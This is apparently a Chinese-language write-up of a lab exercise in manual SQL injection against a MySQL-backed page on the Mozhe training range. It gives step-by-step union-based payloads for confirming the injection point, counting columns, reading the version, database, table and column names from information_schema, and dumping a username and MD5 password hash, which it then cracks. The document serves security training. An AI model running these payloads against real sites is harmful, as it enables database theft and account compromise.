### SQL注入

#### 墨者学院靶场[SQL手工注入漏洞测试(MySQL数据库)](https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe)
1. 第一步: 查看是否存在注入点 
    `and 1=1` 可以打开
    `id=1 and 1=2` 不能打开
    `id=1 西瓜` 不能打开
1. 第二步: 查看列数量
    `id=1 order by X` X从1不断往上递加直到网页不能正常显示,此题目最大值为4,说明为4列
1. 第三步: 报错查看列名情况
    `id=-1 union select 1,2,3,4` 显示为2,3
1. 第四步: 从2,3查询, 查看版本, 数据库等信息
    `id=-1 union select 1,version(),database(),4` 此题结果, 版本:`version() = 5.7.22-0ubuntu0.16.04.1` 数据库: `database()=mozhe_Discuz_StormGroup`
    查询表名:
    `id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'` 表名结果:`StormGroup_member,notice` 对此题来说,是`StormGroup_member`
    查询列名:
    `id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member'` 列名结果: `id,name,password,status`
1. 第五步: 查询数据
    `id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1`
    结果`name=mozhe` | `password=861de5d5f0a8128d0fab489996355994`
6.第六步:MD5解密
    name:mozhe 
    password:874769


#### 题目总结

1. 判定注入点
1. 查看列数量
1. 通过报错注入配合页面查看数据回显
1. 通过union联合查询拿到数据库版本,数据库名,表名,列名等信息
1. 查询出数据